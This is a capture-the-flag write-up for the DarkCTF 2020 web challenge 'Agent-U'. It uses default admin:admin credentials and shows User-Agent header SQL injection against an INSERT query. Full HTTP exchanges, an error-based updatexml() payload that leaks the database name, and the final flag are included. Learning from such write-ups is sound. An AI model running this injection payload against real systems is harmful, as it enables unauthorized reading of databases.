@@ -1,0 +1,227 @@
+<h1>DarkCTF 2020 – Agent-U</h1>
+
+<ul>
+<li><strong>Category:</strong> web</li>
+<li><strong>Points:</strong> 395</li>
+</ul>
+
+<h2>Challenge</h2>
+
+<blockquote>
+  <p>Agent U stole a database from my company but I don't know which one. Can u help me to find it?</p>
+  
+  <p>http://agent.darkarmy.xyz/</p>
+  
+  <p>flag format darkCTF{databasename}</p>
+</blockquote>
+
+<h2>Solution</h2>
+
+<p>Connecting to the web site will give you an authentication form with your IP printed on it. The title of the challenge seems related to the <em>User-Agent</em> string.</p>
+
+<p>```html
+<!DOCTYPE html>
+<html>
+<head>
+<title>Agent U</title>
+</head></p>
+
+<p><body></p>
+
+<p><center><font color=red><h1>Welcome Players To MY Safe House</h1></font></center> <br><br><br></p>
+
+<form action="" name="form1" method="post">
+<center>
+<font color=yellow> Username : </font><input type="text"  name="uname" value=""/>  <br> <br>
+
+<font color=yellow> Password : </font> <input type="text" name="passwd" value=""/></br> <br>
+<input type="submit" name="submit" value="Submit" />
+</center></form>
+
+<p><font size="3" color="#FFFF00"></p>
+
+<pre><code>&lt;br&gt;&lt;!-- TRY DEFAULT LOGIN admin:admin --&gt; &lt;br&gt;
+</code></pre>
+
+<p><br>Your IP ADDRESS is: x.x.x.x<br></p>
+
+<p></font></p>
+
+</div>
+</body>
+</html>
+```
+
+Analyzing the HTML source code, you can discover default credentials. Using them will print your User-Agent and an image.
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+<title>Agent U</title>
+</head>
+
+<body>
+
+<center><font color=red><h1>Welcome Players To MY Safe House</h1></font></center> <br><br><br>
+
+
+
+<form action="" name="form1" method="post">
+<center>
+<font color=yellow> Username : </font><input type="text"  name="uname" value=""/>  <br> <br>
+
+<font color=yellow> Password : </font> <input type="text" name="passwd" value=""/></br> <br>
+<input type="submit" name="submit" value="Submit" />
+</center></form>
+
+
+<font size="3" color="#FFFF00">
+<pre><code>&lt;br&gt;&lt;!-- TRY DEFAULT LOGIN admin:admin --&gt; &lt;br&gt;
+
+<p></code></pre>
+<br>Your IP ADDRESS is: x.x.x.x<br><font color= "#FFFF00" font size = 3 &gt;</font><font color= "#0000ff" font size = 3 &gt;Your User Agent is: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0</font><br><br><br><img src="vibes.png"  /><br></p>
+
+<p></font>
+</div>
+</body>
+</html>
+```</p>
+
+<p>The usage of <code>X-Forwarded-For: 127.0.0.1</code> doesn't alter the IP address.</p>
+
+<p>The challenge talks about a database, so trying to alter the User-Agent during authentication will give you a SQL error. <em>SQL injection</em> is possible via User-Agent string.</p>
+
+<p>```
+POST / HTTP/1.1
+Host: agent.darkarmy.xyz
+User-Agent: '
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 38
+Origin: http://agent.darkarmy.xyz
+Connection: close
+Referer: http://agent.darkarmy.xyz/
+Cookie: __cfduid=db2eda04fd2928b25481f8352b452e3151601110047
+Upgrade-Insecure-Requests: 1</p>
+
+<p>uname=admin&amp;passwd=admin&amp;submit=Submit</p>
+
+<p>HTTP/1.1 200 OK
+Date: Sat, 26 Sep 2020 08:54:56 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+X-Powered-By: PHP/7.2.33
+Vary: Accept-Encoding
+CF-Cache-Status: DYNAMIC
+cf-request-id: 056b386df800000f621202d200000001
+Server: cloudflare
+CF-RAY: 5d8bc35ccbb30f62-MXP
+Content-Length: 989</p>
+
+<p><!DOCTYPE html>
+<html>
+<head>
+<title>Agent U</title>
+</head></p>
+
+<p><body></p>
+
+<p><center><font color=red><h1>Welcome Players To MY Safe House</h1></font></center> <br><br><br></p>
+
+<form action="" name="form1" method="post">
+<center>
+<font color=yellow> Username : </font><input type="text"  name="uname" value=""/>  <br> <br>
+
+<font color=yellow> Password : </font> <input type="text" name="passwd" value=""/></br> <br>
+<input type="submit" name="submit" value="Submit" />
+</center></form>
+
+<p><font size="3" color="#FFFF00"></p>
+
+<pre><code>&lt;br&gt;&lt;!-- TRY DEFAULT LOGIN admin:admin --&gt; &lt;br&gt;
+</code></pre>
+
+<p><br>Your IP ADDRESS is: x.x.x.x<br><font color= "#FFFF00" font size = 3 &gt;</font><font color= "#0000ff" font size = 3 &gt;Your User Agent is: '</font><br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'x.x.x.x', 'admin')' at line 1<br><br><img src="vibes.png"  /><br></p>
+
+<p></font>
+</div>
+</body>
+</html>
+```</p>
+
+<p>So you have to leak the database name. The problem is that this query is an <code>INSERT</code> one, so you need to apply an appropriate approach. You can use an <a href="https://osandamalith.com/2017/02/08/mysql-injection-in-update-insert-and-delete/">error based approach via <code>Updatexml()</code></a>.</p>
+
+<p>The correct payload is the following.</p>
+
+<p><code>sql
+'or updatexml(0,concat(0x7e,(SELECT database())),0) or'', '127.0.0.1', 'admin') #
+</code></p>
+
+<p>```
+POST / HTTP/1.1
+Host: agent.darkarmy.xyz
+User-Agent: 'or updatexml(0,concat(0x7e,(SELECT database())),0) or'', '127.0.0.1', 'admin') #
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 38
+Origin: http://agent.darkarmy.xyz
+Connection: close
+Referer: http://agent.darkarmy.xyz/
+Cookie: __cfduid=db2eda04fd2928b25481f8352b452e3151601110047
+Upgrade-Insecure-Requests: 1</p>
+
+<p>uname=admin&amp;passwd=admin&amp;submit=Submit</p>
+
+<p>HTTP/1.1 200 OK
+Date: Sat, 26 Sep 2020 09:29:10 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+X-Powered-By: PHP/7.2.33
+Vary: Accept-Encoding
+CF-Cache-Status: DYNAMIC
+cf-request-id: 056b57c35500000f7e720c8200000001
+Server: cloudflare
+CF-RAY: 5d8bf57eebb20f7e-MXP
+Content-Length: 944</p>
+
+<p><!DOCTYPE html>
+<html>
+<head>
+<title>Agent U</title>
+</head></p>
+
+<p><body></p>
+
+<p><center><font color=red><h1>Welcome Players To MY Safe House</h1></font></center> <br><br><br></p>
+
+<form action="" name="form1" method="post">
+<center>
+<font color=yellow> Username : </font><input type="text"  name="uname" value=""/>  <br> <br>
+
+<font color=yellow> Password : </font> <input type="text" name="passwd" value=""/></br> <br>
+<input type="submit" name="submit" value="Submit" />
+</center></form>
+
+<p><font size="3" color="#FFFF00"></p>
+
+<pre><code>&lt;br&gt;&lt;!-- TRY DEFAULT LOGIN admin:admin --&gt; &lt;br&gt;
+</code></pre>
+
+<p><br>Your IP ADDRESS is: x.x.x.x<br><font color= "#FFFF00" font size = 3 &gt;</font><font color= "#0000ff" font size = 3 &gt;Your User Agent is: 'or updatexml(0,concat(0x7e,(SELECT database())),0) or'', '127.0.0.1', 'admin') #</font><br>XPATH syntax error: '~ag3nt<em>u</em>1s<em>v3ry</em>t3l3nt3d'<br><br><img src="vibes.png"  /><br></p>
+
+<p></font>
+</div>
+</body>
+</html>
+```</p>
+
+<p>The flag is composed with the database name, so it is the following.</p>
+
+<p><code>
+darkCTF{ag3nt_u_1s_v3ry_t3l3nt3d}
+</code></p>
